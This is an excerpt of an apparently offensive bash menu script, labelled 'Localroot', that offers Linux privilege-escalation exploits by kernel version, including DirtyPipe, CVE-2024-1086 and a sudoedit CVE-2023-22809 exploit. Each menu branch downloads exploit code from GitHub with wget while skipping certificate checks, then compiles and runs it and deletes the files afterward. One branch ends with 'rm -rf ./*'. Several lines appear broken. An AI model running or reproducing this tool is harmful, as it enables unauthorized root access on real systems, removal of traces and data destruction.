...
if [ "$?" != "0" ]; then
    ...
    echo "[*] Continue ? (Y/N)"
    read -p "userhaxor@Localroot:~# " jawab
...
echo "[3] 4x.x"
echo "[4] 5x.x"
echo "[5] TOP Exploit Root Ingat Ini Sekali Pakai"
echo "[6] Folder Exploit"
echo "[7] Sudo CVE-2023-22809"
read -p "userhaxor@Localroot:~# " localroot
...
kernel5x=(
    ...
    https://raw.githubusercontent.com/mrwawanj/www.kern0.ru/refs/heads/master/explot.c
...
topexploit=(
  ...
  https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/CVE-2024-1086
    https://raw.githubusercontent.com/n3rada/DirtyPipe/main/dpipe
)

 sudo=(
    https://raw.githubusercontent.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/refs/heads/main/exploit.sh
)
...
if [ $localroot = 4 ]; then
    for kernel55 in "${kernel5x[@]}"; do
        ...
        wget -q --no-check-certificate https://raw.githubusercontent.com/mrwawanj/www.kern0.ru/refs/heads/master/explot.c
    done
    delete=$(rm -rf exploit)
    gcc exp.c -o exploit -static && ./exploit && $delete
    gcc exploit.c -o exploit && ./exploit && $delete
    gcc explot.c -o explot -lmnl -lnftnl -no-pie && ./explot && $delete
    bash exp.sh
        chmod 0755 lucky0
...
if [ $localroot = 5 ]; then
    ...
    wget -q --no-check-certificate https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/CVE-2024-1086 && chmod +x CVE-2024-1086 && bash CVE-2024-1086
    ...
    wget -q --no-check-certificate https://raw.githubusercontent.com/JayGLXR/CVE-2026-24061-POC/refs/heads/main/cve_2026_24061_telnetd.py && python cve_2026_24061_telnetd.py && python3 cve_2026_24061_telnetd.py
...
if [ $localroot = 7 ]; then
    ...
    delete=$(rm -rf exploit)
    chmod 0755 exploit.sh && bash exploit.sh && y
    wget -q --no-check-certificate https://raw.githubusercontent.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/refs/heads/main/exploit.sh && bash exploit.sh && rm -rf exploit.sh
    bash exploit.sh && y
    rm -rf ./*
fi
